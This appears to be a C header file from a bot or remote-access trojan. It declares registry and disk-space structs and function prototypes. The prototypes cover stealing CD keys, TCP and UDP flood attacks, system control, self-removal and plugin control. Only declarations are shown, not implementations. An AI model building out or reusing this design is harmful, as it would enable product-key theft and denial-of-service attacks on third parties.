
typedef struct REGKEYS 
{
	HKEY hkey;
	LPCTSTR Subkey;
	LPCTSTR Value;
	LPCTSTR Name;
	LPCTSTR File;
	LPCTSTR tag;
	bool OnlyAdv;

} REGKEYS;

typedef struct DKSP
{
	__int64 AvailableBytes;
	__int64 FreeBytes;
	__int64 TotalBytes;

} DKSP;

typedef struct DKSPKB
{
	char AvailableKB[128];
	char FreeKB[128];
	char TotalKB[128];
	__int64 iFreeKB;
	__int64 iTotalKB;
	
} DKSPKB;

bool XGetSystemInfo(SESSION* Session);

bool XGetNetworkInfo(SESSION* Session, char *Type);

bool XGetCDKeys(SESSION* Session, char *All);


bool XRemove(char *Message);

bool XSystemControl(SESSION* Session, char *Type);

bool XTCPFlood(SESSION* Session, char *Host, char *Port, char *Delay, char *Times, char *Sockets, char *Data);

bool XUDPFlood(SESSION* Session, char *Host, char *Port, char *Delay, char *Times, char *Sockets, char *Data);

bool XDriveInfo(SESSION* Session, char *Drive);

bool XPluginControl(SESSION* Session, char *Type, char *ID, char *Param0, char  *Param1, char  *Param2, char  *Param3, char  *Param4, char  *Param5, char  *Param6, char  *Param7, char  *Param8, char  *Param9);
